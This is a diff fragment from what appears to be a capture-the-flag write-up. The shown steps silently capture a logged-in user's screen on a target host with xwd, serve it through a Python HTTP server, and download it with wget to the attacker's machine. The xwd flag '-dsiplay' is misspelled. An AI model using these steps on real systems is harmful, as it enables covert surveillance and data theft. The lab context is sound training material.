@@ -75,7 +75,7 @@ Step 2: To run ‘xwd’ we need to know the ‘display’.  Run command ‘w’
   
 The output from the ‘w’ command shows in the ‘FROM’ column that the display used is ‘:0’ .
 
-We are ready to run ‘xwd’. Use command: xwd -root -screen -silent -dsiplay :0 > /tmp/screen.xwd 
+We are ready to run ‘xwd’. Use command: xwd -root -screen -silent -dsiplay :0 > /tmp/screen.xwd <br>
 Download /tmp/screen.xwd to our local system.  To do this we will open a python server on the target shell using command: python3 -m http.server 8000.  <br>
 On our local system, use command: wget http://10.10.11.191/screen.xwd
 
